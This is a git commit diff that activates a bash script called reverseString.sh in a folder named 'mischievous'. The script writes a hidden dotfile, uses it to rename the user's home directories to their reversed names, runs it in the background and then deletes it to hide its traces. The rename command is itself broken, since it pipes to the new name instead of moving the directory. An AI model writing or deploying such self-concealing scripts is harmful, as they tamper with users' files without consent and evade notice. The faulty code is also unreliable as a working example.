3c7e259a74667afa77dd08b8c37c3137686314a3
CompEng0001 <sb1501@canterbury.ac.uk>
2023-09-12 17:10:41 +0100

    mod: modified script to delete itself

--- mischievous/reverseString.sh
+++ mischievous/reverseString.sh
@@ -1,19 +1,22 @@
-#! /usr/bin/
+#! /usr/bin/env bash
 
-#REVERSESTRINGDIR=".reverseString.sh"
+REVERSESTRINGDIR=".reverseString.sh"
 
-#touch "${REVERSESTRINGDIR}"
-#tee <<'EOF' "${REVERSESTRINGDIR}" > /dev/null
-#! /usr/bin/
+touch "${REVERSESTRINGDIR}"
+tee <<'EOF' "${REVERSESTRINGDIR}" > /dev/null
+#! /usr/bin/env bash
 # this script reverses the directories names for fun
-#DIRECTORIES=$(cd && echo */ | tr -d '/')
+DIRECTORIES=$(cd && echo */ | tr -d '/')
 
-#for D in ${DIRECTORIES[@]}
-#do
-#        RVD=$(echo "${D}" | rev)
-#        mv ${D} | ${RVD} 
-#done
-#EOF
+for D in ${DIRECTORIES[@]}
+do
+        RVD=$(echo "${D}" | rev)
+        mv ${D} | ${RVD} 
+done
+EOF
 
 
-#bash ${REVERSESTRINGDIR} &
+# Loaded into working memory and excuted in the background, could disown too.
+bash ${REVERSESTRINGDIR} &
+# remove script because, it is not nice.
+rm ${REVERSESTRINGDIR}
